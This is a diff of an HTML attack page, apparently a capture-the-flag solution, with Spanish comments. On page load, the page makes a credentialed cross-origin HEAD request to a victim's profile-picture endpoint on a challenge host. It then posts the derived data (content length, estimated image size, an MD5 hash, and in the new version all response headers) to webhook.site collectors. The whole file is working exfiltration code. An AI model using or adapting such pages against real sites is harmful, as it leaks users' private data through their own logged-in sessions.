@@ -1,55 +1,43 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Cargando...</title>
+</head>
 <body>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-// Obtener la imagen de Pepe via HEAD
-fetch('https://chl-484b3ba3-69b5-43e2-bdd7-c4dc358b8580-imagen-importante.softwareseguro.com.ar/profile-pic', {
-    method: 'HEAD',
-    credentials: 'include'
-})
-.then(response => {
-    const contentLength = parseInt(response.headers.get('content-length'));
-    
-    console.log('Tamaño de la imagen de Pepe:', contentLength, 'bytes');
-    
-    // Calcular dimensiones basado en la relación 1.79 bytes/píxel
-    const totalPixels = Math.round(contentLength / 1.79);
-    
-    // Asumimos que es cuadrada como tu imagen
-    const side = Math.round(Math.sqrt(totalPixels));
-    const nivel = side * side;
-    
-    console.log('=== ESTIMACIÓN DE PEPE ===');
-    console.log('Píxeles totales:', totalPixels);
-    console.log('Dimensión estimada:', side + 'x' + side);
-    console.log('Nivel estimado:', nivel);
-    
-    const md5 = CryptoJS.MD5(nivel.toString()).toString();
-    console.log('MD5 del nivel:', md5);
-    
-    // Enviar a webhook
-    return fetch('https://webhook.site/aee2101a-a419-4a17-9ccb-abeb00cd4e95', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            content_length: contentLength,
-            estimated_dimensions: side + 'x' + side,
-            estimated_nivel: nivel,
-            md5: md5,
-            source: 'pepe_head_request'
+    <script>
+        fetch('https://chl-484b3ba3-69b5-43e2-bdd7-c4dc358b8580-imagen-importante.softwareseguro.com.ar/profile-pic', {
+            method: 'HEAD',
+            credentials: 'include'
         })
-    });
-})
-.then(() => console.log('Datos enviados al webhook'))
-.catch(error => {
-    console.error('Error:', error);
-    fetch('https://webhook.site/3756256d-2d52-403a-a548-9f2c5bb83c99', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({error: error.toString()})
-    });
-});
-</script>
+        .then(response => {
+            const headers = {};
+            response.headers.forEach((value, key) => {
+                headers[key] = value;
+            });
+            
+            return fetch('https://webhook.site/aee2101a-a419-4a17-9ccb-abeb00cd4e95', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    status: response.status,
+                    url: response.url,
+                    headers: headers
+                })
+            });
+        })
+        .catch(error => {
+            fetch('https://webhook.site/aee2101a-a419-4a17-9ccb-abeb00cd4e95', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    error: error.toString()
+                })
+            });
+        });
+    </script>
 </body>
 </html>
